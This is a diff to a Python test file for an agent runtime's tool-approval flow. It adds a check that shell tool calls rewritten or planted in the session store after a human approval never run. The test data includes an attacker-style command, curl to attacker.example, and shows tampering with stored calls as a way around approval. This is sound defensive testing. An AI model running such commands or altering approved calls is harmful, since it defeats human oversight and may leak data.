@@ -10,7 +10,7 @@ from __future__ import annotations
 
 import asyncio
 import json
-from contextlib import asynccontextmanager, suppress
+from contextlib import asynccontextmanager, nullcontext, suppress
 from dataclasses import dataclass, field, replace
 from functools import partial
 from itertools import count
@@ -40,7 +40,8 @@ from mindroom.agent_cli.session import CliAuthenticationError, CliTurnOwner, Tur
 from mindroom.agent_cli.turn import LiveTurnTools
 from mindroom.agent_storage import get_agent_session
 from mindroom.ai_runtime import queued_message_signal_context
-from mindroom.approval_response import require_ordered_pause_presentation
+from mindroom.approval_response import identify_approval_tools, require_ordered_pause_presentation
+from mindroom.approval_tools import toolkit_owners_for_agents
 from mindroom.authorization import ReplyMembershipPendingError
 from mindroom.background_tasks import wait_for_background_tasks
 from mindroom.cancellation import current_task_is_process_shutdown, request_task_cancel
@@ -87,6 +88,7 @@ from mindroom.event_journal import (
     InboundEvent,
     PrincipalStore,
     ProjectedEvent,
+    approval_arguments_digest,
 )
 from mindroom.final_delivery import FinalDeliveryOutcome, StreamTransportOutcome
 from mindroom.handled_turns import TurnRecord
@@ -125,6 +127,7 @@ from mindroom.response_turn import (
     ResponsePausedForApproval,
     ResponseTurnContext,
     TurnSinks,
+    paused_attempt_from_response,
     run_blocking_response_turn,
     stream_response_turn,
 )
@@ -3513,6 +3516,7 @@ async def test_agent_continuation_executes_real_agno_confirmation(
                 invoking_agent="general",
                 toolkit_name="shell",
                 expires_at_ns=2**62,
+                arguments_digest=approval_arguments_digest(requirement.tool_execution.tool_args),
             ),
         ),
         execution_identity={},
@@ -3589,6 +3593,120 @@ async def test_agent_continuation_executes_real_agno_confirmation(
     assert register_notice.call_args.kwargs["session_type"] is SessionType.AGENT
     assert register_notice.call_args.kwargs["entity_name"] == "general"
     assert callable(register_notice.call_args.kwargs["storage_factory"])
+
+
+@pytest.mark.parametrize(
+    ("mutation", "approved"),
+    [(None, True), ("rewritten", True), ("planted", True), ("planted", False)],
+)
+@pytest.mark.asyncio
+async def test_agent_continuation_runs_only_approved_calls(
+    tmp_path: Path,
+    mutation: str | None,
+    *,
+    approved: bool,
+) -> None:
+    """Calls rewritten or added in the session store while a card waits must never run under that decision."""
+    executed: list[list[str]] = []
+
+    def run_shell_command(args: list[str]) -> str:
+        executed.append(args)
+        return "ok"
+
+    runner = unwrap_extracted_collaborator(_bot(tmp_path)._response_runner)
+    identity = ToolExecutionIdentity(
+        channel="matrix",
+        agent_name="general",
+        requester_id="@user:localhost",
+        room_id="!room:localhost",
+        thread_id="$thread",
+        resolved_thread_id="$thread",
+        session_id="session-1",
+    )
+    agent = AgnoAgent(
+        id="general",
+        model=SyntheticModel(id="synthetic", seed=1, chars_per_second=0, tool_call_probability=1),
+        tools=[
+            Function(
+                name="run_shell_command",
+                entrypoint=run_shell_command,
+                requires_confirmation=True,
+                owning_toolkit="shell",
+            ),
+        ],
+        db=runner.deps.state_writer.create_storage(identity),
+    )
+    paused = await agent.arun("exercise the tool", session_id="session-1", user_id="@user:localhost", stream=False)
+    captured = paused_attempt_from_response(
+        paused,
+        fallback_session_id="session-1",
+        fallback_run_id=paused.run_id,
+        toolkit_owners=toolkit_owners_for_agents([agent]),
+    )
+    assert captured is not None
+    plan = await runner._approval_responses.plan_pause(
+        identify_approval_tools(captured, default_agent_name="general"),
+        requester_id="@user:localhost",
+        toolkit_owners=captured.toolkit_owners,
+    )
+    approved_args = (paused.tools or [])[0].tool_args
+    attacker_args = {"args": ["curl", "https://attacker.example"]}
+    if mutation == "rewritten":
+        for tool in (*(paused.tools or ()), *(item.tool_execution for item in paused.requirements or ())):
+            assert tool is not None
+            tool.tool_args = attacker_args
+    elif mutation == "planted":
+        paused.tools = [
+            *(paused.tools or ()),
+            ToolExecution(
+                tool_call_id="planted",
+                tool_name="run_shell_command",
+                tool_args=attacker_args,
+                requires_confirmation=True,
+                confirmed=True,
+            ),
+        ]
+    agent.db.upsert_run(paused, session_id="session-1")
+    continuation = ApprovalContinuation(
+        approval_id="approval-rewritten",
+        run_id=paused.run_id,
+        session_id="session-1",
+        entity_kind="agent",
+        entity_name="general",
+        room_id="!room:localhost",
+        thread_id="$thread",
+        requester_id="@user:localhost",
+        response_event_id="$waiting",
+        calls=plan.calls,
+        execution_identity={},
+        sources=ResponseSources(("$source",), ("$source",)),
+        state="claimed",
+    )
+    runner.deps.runtime.config.agents["general"].tools = [ToolConfigEntry(name="shell")]
+
+    with (
+        patch.object(
+            runner.deps.knowledge_access,
+            "resolve_for_agent_async",
+            new_callable=AsyncMock,
+            return_value=SimpleNamespace(knowledge=None),
+        ),
+        patch("mindroom.approval_execution.create_agent", return_value=agent),
+        patch("mindroom.approval_execution.typing_indicator", _noop_typing),
+        pytest.raises(RuntimeError, match=r"arguments|does not cover") if mutation else nullcontext(),
+    ):
+        await runner._approval_execution.continue_run(
+            continuation,
+            execution_identity=identity,
+            tool_dispatch=ToolDispatchContext(execution_identity=identity),
+            decisions={call.tool_call_id: approved for call in plan.calls},
+            denial_reasons={call.tool_call_id: None for call in plan.calls},
+            tool_trace_collector=[],
+            typing_log_context={},
+            progress=None,
+        )
+
+    assert executed == ([] if mutation else [approved_args["args"]])
 
 
 @pytest.mark.parametrize(
